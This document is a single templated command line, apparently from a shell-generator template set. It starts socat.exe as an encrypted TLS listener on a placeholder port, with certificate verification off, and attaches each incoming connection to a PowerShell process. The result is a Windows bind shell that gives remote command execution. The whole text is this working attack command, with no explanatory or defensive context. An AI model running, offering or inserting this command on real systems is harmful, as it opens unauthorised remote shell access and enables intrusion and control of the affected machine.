socat.exe openssl-listen:{{ LPORT }},cert=shell.pem,verify=0,reuseaddr,fork exec:powershell.exe,pipes
